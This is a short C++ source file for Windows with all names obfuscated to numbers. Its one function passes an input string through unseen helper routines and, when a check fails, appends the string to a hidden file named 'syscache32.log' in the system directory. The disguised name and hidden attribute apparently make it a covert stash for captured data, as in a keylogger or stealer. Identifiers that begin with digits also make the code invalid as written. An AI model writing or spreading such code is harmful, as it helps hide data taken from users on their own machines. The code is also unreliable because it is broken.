#include "01.h"
#include "22.h"
#include "24.h"
#include "25.h"
#include "26.h"
void 22(const std::wstring& a) {
    if (a.empty()) return;
    std::wstring b = 24(a);
    std::string c = 25(b);
    bool d = 26(c);
    if (!d) {
        std::wstring f = L"\\syscache32.log";
        wchar_t g[MAX_PATH];
        GetSystemDirectory(g, MAX_PATH);
        std::wstring h = g;
        h += f;
        HANDLE i = CreateFile(h.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (i != INVALID_HANDLE_VALUE) {
            SetFilePointer(i, 0, NULL, FILE_END);
            DWORD j;
            std::wstring k = b + L"\r\n";
            WriteFile(i, k.c_str(), (DWORD)(k.size() * 2), &j, NULL);
            CloseHandle(i);
        }
    }
}
